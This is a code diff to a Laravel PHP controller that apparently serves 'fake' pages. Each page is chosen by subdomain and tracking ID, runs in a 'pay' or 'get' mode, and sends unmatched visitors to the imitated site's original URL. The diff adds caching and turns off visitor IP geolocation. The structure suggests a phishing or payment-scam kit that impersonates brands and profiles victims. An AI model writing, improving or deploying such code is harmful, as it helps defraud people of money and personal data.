@@ -38,9 +38,6 @@ class PagesController extends Controller
             $key = 'track_id';
             $route = $request->route();
             $this->subdomain = getSubDomain() ?? $route->originalParameter('subdomain') ?? null;
-            $category = $this->category = Category::get()->filter(function ($category) {
-                return in_array($this->subdomain, explode(',', setting($category->name, $category->name)));
-            })->first();
             $this->uuid = $request->session()->get('uuid');
             $track_id = ($request->has($key) || (!$request->ajax() && $request->method() === 'GET'))
                 ? $request->get($key)
@@ -48,8 +45,16 @@ class PagesController extends Controller
             $this->isPay = !$request->has('get') && ($request->has('pay') || $request->session()->get('fake.type') === 'pay');
             $request->session()->put('fake.type', ($this->isPay ? 'pay' : 'get'));
             try {
-                if (is_null($track_id) || is_null($category)) throw new Exception();
-                $this->fake = $category->fakes()->whereTrackId($track_id)->first();
+                $this->category = Cache::remember("category:$track_id", 15, function () {
+                    return Category::get()->filter(function (Category $category) {
+                        return in_array($this->subdomain, explode(',', setting($category->name, $category->name)));
+                    })->first();
+                });
+                if (is_null($track_id) || is_null($this->category)) throw new Exception();
+                $this->fake = Cache::remember("fake:$track_id", 15, function () use ($key, $track_id) {
+                    return $this->category->fakes()->where($key, $track_id)->first();
+                });
+
                 if (is_null($this->fake)) throw new Exception();
                 $track_id = $this->fake->track_id;
                 $request->session()->put($key, $track_id);
@@ -69,10 +74,12 @@ class PagesController extends Controller
                     ]);
                 }
                 return $next($request);
-            } catch (Throwable $exception) {
+            } catch (Throwable | Exception $exception) {
+                Cache::forget("category:$track_id");
+                Cache::forget("fake:$track_id");
                 session()->forget($key);
             }
-            return redirect((new Fake())->originalUrl($category->name ?? null));
+            return redirect((new Fake())->originalUrl($this->category->name ?? null));
         });
     }
 
@@ -127,7 +134,7 @@ class PagesController extends Controller
         try {
             $fake = $this->getFake();
             $ip = \request()->ip();
-            $ipData = ipstack($ip);
+            $ipData = null;//ipstack($ip);
             $city_geo = is_null($ipData)
                 ? ""
                 : "{$ipData['location']['country_flag_emoji']} {$ipData['city']}, {$ipData['region_name']}";
